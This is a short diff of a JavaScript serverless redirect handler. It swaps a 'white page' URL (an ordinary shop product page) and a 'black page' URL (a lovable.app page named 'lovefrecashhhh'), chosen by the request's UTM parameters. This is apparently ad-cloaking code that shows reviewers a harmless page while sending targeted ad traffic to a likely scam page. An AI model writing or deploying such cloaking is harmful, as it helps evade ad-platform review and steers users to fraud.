@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://shopmercimilo.com/collections/traditional-toys/products/new-goose-push-along-toy";
-    const blackPageURL = "https://nowhereher.lovable.app/";
+    const whitePageURL = "https://www.goal-zone.shop/products/germany-baby-jersey-2024-2025";
+    const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
